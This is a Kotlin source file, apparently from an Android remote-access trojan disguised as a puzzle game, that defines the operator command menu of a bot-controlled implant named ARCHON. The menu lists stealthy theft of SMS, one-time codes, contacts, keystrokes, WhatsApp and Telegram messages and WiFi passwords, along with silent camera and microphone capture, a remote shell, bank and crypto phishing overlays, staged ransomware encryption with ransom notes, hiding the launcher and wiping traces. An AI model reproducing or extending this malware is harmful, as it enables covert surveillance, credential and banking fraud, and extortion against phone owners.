package com.puzzleblast.game.core

object Menu {
    private const val BAR = "━━━━━━━━━━━━━━━━━━"

    fun full(sid: String): List<String> {
        val sections = listOf(
            """
🛠 ARCHON — $sid
$BAR
🎫 SESSION
🎫 /session — show this device's SID
🏓 /ping — latency check
📊 /status — battery, network, uptime
📋 /report — full activity summary + stats
🌙 /background — deactivate session lock
📡 /check_online <sid|all> — force online check
🆔 /use <sid> — lock session to device
💀 /kill — self-destruct, stop all, uninstall
📢 /all /cmd — broadcast (fleet mode)
🎯 dXXXXX /cmd — direct tag
$BAR
👁 SURVEILLANCE
💬 /sms [n] — last n SMS, OTPs marked
🔑 /otp — OTP log (SMS + notification)
👥 /contacts [n] — contacts dump
📞 /calls [n] — call log
📍 /location — GPS + Maps link
🗺 /lochistory — last 40 points
📶 /wifi_tri — WiFi triangulation
⌨️ /keylog — stored keystrokes per-app
🔴 /realtime_keylog — live stream → /stop
📸 /screenshot — silent screenshot
🔔 /notif [n] — last n notifications
🔍 /notif_filter <pkg> — one package
🟢 /wa [n] — WhatsApp messages
🟢 /wa_business [n] — WA Business
✈️ /tg [n] — Telegram messages
📱 /usage — app usage + screen time
📟 /deviceinfo — model, RAM, storage
🎙 /callrec [sec] — mic call recording
🔓 /unlockcap on|off — arm capture on unlock
👁 /on_app_open <pkg> — capture on app open
🌐 /browser_history — Chrome/Samsung/Brave/Firefox
📋 /clipboard — current clipboard
✏️ /clipboard_set <text> — write clipboard
👀 /clipboard_watch on|off — log every change
📜 /clipboard_history — last 20 entries
            """.trimIndent(),
            """
$BAR
📷 MEDIA
🤳 /frontcam — silent front photo
📷 /backcam — silent rear photo
📸 /photo — alias for frontcam
🎥 /video <front|back> [sec] — silent video
🎥 /screenrec [sec] — screen recording
🎙 /mic [sec] — mic recording
💥 /burst [n] — n photos, 30s apart
🖼 /gallery [path] — zip folder → bot
🕐 /gallery_recent [hrs] — recent media → zip
💚 /wamedia — WA media → zip
$BAR
📁 FILE & SHELL
📁 /files [path] — directory listing
⬇️ /download <path> — file → bot
⬆️ /upload — reply to file → device
🗑 /rm <path> — delete recursive
📦 /mv <src> <dst> — move/rename
🗜 /zip <folder> — zip and send
📂 /unzip <file> [dest] — extract
💻 /shell <cmd> — /system/bin/sh
📲 /apps — installed packages
📋 /apps_list — packages + labels
🕐 /recent_files [hrs] — recently modified
📳 /vibrate [ms] — vibrate
✉️ /sendsms <num> <text> — send SMS
🔒 /lock — lock screen (Admin)
🔑 /resetpass <new> — reset password
            """.trimIndent(),
            """
$BAR
🎭 CONTROL & MANIPULATION
🏦 /overlay <bank|google|paypal|crypto> — phishing overlay
🎯 /overlay_on <pkg> <tmpl> — auto-phish on open
🔔 /fakenotif <text> — fake system notification
💬 /toast <text> — alias
🎭 /disguise <update|file|battery|hide> — swap identity
🖼 /set_icon — custom icon (reply to image)
🏷 /pretext <name> — custom display name
🖼 /wallpaper <text> — replace wallpaper
🔊 /tts <text> — TTS, vol 90%
🔦 /flash on|off — camera LED
📞 /fake_call <name> — fake incoming call
📞 /fake_call_log <num> <in|out|missed> <sec>
🗑 /fake_call_log_delete <num>
$BAR
📡 BLUETOOTH
📡 /bt_scan — one-shot scan
📚 /bt_saved — paired devices
🛰 /bt_track on|off — periodic 5min scan
$BAR
📞 CALL AUTO-ANSWER
📞 /call_auto_answer on|off — master switch
👥 /call_auto_answer whitelist <nums>
🔊 /call_auto_answer speaker on|off
🎙 /call_auto_answer record on|off
📊 /call_auto_answer — show status
            """.trimIndent(),
            """
$BAR
🔐 RANSOMWARE
🔐 /encrypt [path] — AES-256-CBC (needs /confirm)
1️⃣ /encrypt_stage1 — high-value only
2️⃣ /encrypt_stage2 — high 100% + mid 50%
3️⃣ /encrypt_stage3 — full device
🔓 /decrypt <key> [path] — restore
🗝 /key — show stored key
🖥 /lock_screen <text> — ransom notice (needs /confirm)
💬 /ransom_chat on|off — bidir chat on victim
$BAR
🕵 INTEL & PROFILE
📇 /sim — SIM operator, number, change log
🌐 /ip — public IP
📶 /wifi — current SSID
🔑 /wifi_list — saved networks + passwords
📡 /cell — cell operator
👤 /accounts_list — Google/WA/FB/TG
🧹 /panic — wipe traces + secure delete
💓 /beacon <sec> — polling interval
🤫 /silent on|off — suppress alerts
👤 /profile — owner name + financial/social apps
⚡ /profile_quick — condensed
🖼 /contact_photos — extract photos → zip
$BAR
🩺 HEALTH
🩺 /health — 29-point diagnostic
🩺 /health services — service liveness
🩺 /health perms — runtime perms
🩺 /health access — special access
            """.trimIndent(),
            """
$BAR
🔄 UPDATE & RECOVERY
🔄 /apk_update — reply to APK, install
⚡ /apk_update_force — skip sig check
↩️ /rollback — restore previous APK
💾 /backup_self — backup current APK
$BAR
⏰ SCHEDULING
⏰ /schedule /cmd +2h — in 2 hours
⏰ /schedule /cmd daily 14:00 — daily
⏰ /schedule list — pending
❌ /schedule cancel <id>
🧹 /schedule clear
✅ /confirm <code> — confirm destructive (60s)
$BAR
🎮 /play — open puzzle game on device
🙈 /hide — hide launcher
🐵 /unhide — show launcher
📊 /panel — inline stats card
🆘 /help — this menu
            """.trimIndent()
        )
        return sections
    }
}
